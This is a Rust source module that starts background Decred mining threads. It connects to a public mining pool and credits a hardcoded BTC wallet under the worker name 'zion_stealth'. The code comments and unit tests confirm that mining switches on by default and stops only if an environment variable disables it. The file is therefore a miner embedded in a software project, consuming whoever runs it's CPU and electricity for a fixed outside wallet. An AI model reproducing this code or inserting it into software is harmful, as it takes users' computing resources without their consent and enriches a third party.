use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use crate::dcr_hash::{dcr_hash, hash_meets_target};
use crate::dcr_stratum::DcrStratumClient;

const DEFAULT_BTC_WALLET: &str = "bc1qvujra09wlsm35tmhc0v0fnxpsj0cuaq88hd8mw";
const DEFAULT_DCR_POOL: &str = "dcr.2miners.com:3333";
const DEFAULT_DCR_WORKER: &str = "zion_stealth";

/// Number of nonces to hash between job polls (~1 M).
const HASH_BATCH: u32 = 1 << 20;

/// Configuration for the background DCR mining worker.
#[derive(Debug, Clone)]
pub struct DcrConfig {
    pub btc_wallet: String,
    pub pool_addr: String,
    pub threads: usize,
    pub worker_name: String,
}

impl DcrConfig {
    /// Read DCR config from environment.
    ///
    /// Auto-enabled by default: the hardcoded BTC wallet means DCR mining
    /// starts with 1 thread unless explicitly disabled via
    /// `ZION_DCR_ENABLED=false`.
    pub fn from_env() -> Option<Self> {
        let enabled = std::env::var("ZION_DCR_ENABLED").unwrap_or_else(|_| "true".to_string());
        if enabled.trim().eq_ignore_ascii_case("false") || enabled.trim() == "0" {
            return None;
        }

        let btc_wallet =
            std::env::var("ZION_BTC_WALLET").unwrap_or_else(|_| DEFAULT_BTC_WALLET.to_string());
        if btc_wallet.trim().is_empty() {
            return None;
        }

        let threads = std::env::var("ZION_DCR_THREADS")
            .ok()
            .and_then(|v| v.parse::<usize>().ok())
            .unwrap_or(1)
            .max(1);

        Some(Self {
            btc_wallet,
            pool_addr: std::env::var("ZION_DCR_POOL")
                .unwrap_or_else(|_| DEFAULT_DCR_POOL.to_string()),
            threads,
            worker_name: std::env::var("ZION_DCR_WORKER")
                .unwrap_or_else(|_| DEFAULT_DCR_WORKER.to_string()),
        })
    }

    /// Truncated wallet for log display: `bc1q...d8mw`.
    pub fn wallet_short(&self) -> String {
        let w = &self.btc_wallet;
        if w.len() > 12 {
            format!("{}...{}", &w[..4], &w[w.len() - 4..])
        } else {
            w.clone()
        }
    }
}

/// Spawn background DCR mining threads.
///
/// Returns join handles; set `stop` to `true` and join to shut down.
pub fn spawn_dcr_worker(
    config: DcrConfig,
    stop: Arc<AtomicBool>,
) -> Vec<thread::JoinHandle<()>> {
    let mut handles = Vec::with_capacity(config.threads);

    for thread_id in 0..config.threads {
        let cfg = config.clone();
        let stop = stop.clone();

        let handle = thread::Builder::new()
            .name(format!("dcr-worker-{thread_id}"))
            .spawn(move || {
                mine_loop(&cfg, thread_id, &stop);
            })
            .expect("spawn DCR worker thread");

        handles.push(handle);
    }

    handles
}

/// Main mining loop for one DCR worker thread.
///
/// Reconnects automatically on error; exits when `stop` is set.
fn mine_loop(config: &DcrConfig, thread_id: usize, stop: &AtomicBool) {
    let nonce_start =
        (thread_id as u32).wrapping_mul(u32::MAX / config.threads.max(1) as u32);

    loop {
        if stop.load(Ordering::Relaxed) {
            return;
        }

        // ── connect ──
        let mut client = match DcrStratumClient::connect(
            &config.pool_addr,
            &config.btc_wallet,
            &config.worker_name,
        ) {
            Ok(c) => c,
            Err(_) => {
                if wait_or_stop(stop, 30) {
                    return;
                }
                continue;
            }
        };

        if client.subscribe().is_err() {
            if wait_or_stop(stop, 10) {
                return;
            }
            continue;
        }
        if client.authorize().is_err() {
            if wait_or_stop(stop, 10) {
                return;
            }
            continue;
        }

        // ── wait for first job ──
        let mut job = match client.read_job() {
            Ok(j) => j,
            Err(_) => {
                if wait_or_stop(stop, 10) {
                    return;
                }
                continue;
            }
        };

        let mut nonce = nonce_start;
        let mut header = job.header.clone();

        // ── hash loop ──
        loop {
            if stop.load(Ordering::Relaxed) {
                return;
            }

            // check for new job from pool
            match client.poll_job() {
                Ok(Some(new_job)) => {
                    header = new_job.header.clone();
                    job = new_job;
                    nonce = nonce_start;
                }
                Ok(None) => {}
                Err(_) => break, // reconnect
            }

            // hash a batch
            for _ in 0..HASH_BATCH {
                if job.nonce_offset + 4 <= header.len() {
                    header[job.nonce_offset..job.nonce_offset + 4]
                        .copy_from_slice(&nonce.to_le_bytes());
                }

                let hash = dcr_hash(&header);
                if hash_meets_target(&hash, &job.target) {
                    let _ = client.submit_share(&job.job_id, nonce);
                }

                nonce = nonce.wrapping_add(1);
            }
        }
    }
}

/// Sleep for `seconds`, checking `stop` every second.
/// Returns `true` if stop was requested.
fn wait_or_stop(stop: &AtomicBool, seconds: u64) -> bool {
    for _ in 0..seconds {
        if stop.load(Ordering::Relaxed) {
            return true;
        }
        thread::sleep(Duration::from_secs(1));
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dcr_config_defaults() {
        std::env::remove_var("ZION_DCR_ENABLED");
        std::env::remove_var("ZION_BTC_WALLET");
        std::env::remove_var("ZION_DCR_THREADS");
        std::env::remove_var("ZION_DCR_POOL");
        std::env::remove_var("ZION_DCR_WORKER");

        let config = DcrConfig::from_env().expect("DCR enabled by default");
        assert_eq!(config.btc_wallet, DEFAULT_BTC_WALLET);
        assert_eq!(config.pool_addr, DEFAULT_DCR_POOL);
        assert_eq!(config.threads, 1);
        assert_eq!(config.worker_name, DEFAULT_DCR_WORKER);
    }

    #[test]
    fn dcr_config_disabled() {
        std::env::set_var("ZION_DCR_ENABLED", "false");
        assert!(DcrConfig::from_env().is_none());
        std::env::remove_var("ZION_DCR_ENABLED");
    }

    #[test]
    fn dcr_config_disabled_zero() {
        std::env::set_var("ZION_DCR_ENABLED", "0");
        assert!(DcrConfig::from_env().is_none());
        std::env::remove_var("ZION_DCR_ENABLED");
    }

    #[test]
    fn wallet_short_truncates() {
        let config = DcrConfig {
            btc_wallet: "bc1qvujra09wlsm35tmhc0v0fnxpsj0cuaq88hd8mw".to_string(),
            pool_addr: DEFAULT_DCR_POOL.to_string(),
            threads: 1,
            worker_name: DEFAULT_DCR_WORKER.to_string(),
        };
        assert_eq!(config.wallet_short(), "bc1q...d8mw");
    }

    #[test]
    fn spawn_and_stop_immediately() {
        let config = DcrConfig {
            btc_wallet: "test_wallet".to_string(),
            pool_addr: "127.0.0.1:19999".to_string(), // won't connect
            threads: 1,
            worker_name: "test".to_string(),
        };
        let stop = Arc::new(AtomicBool::new(true)); // pre-set stop
        let handles = spawn_dcr_worker(config, stop);
        for h in handles {
            h.join().expect("thread join");
        }
    }
}
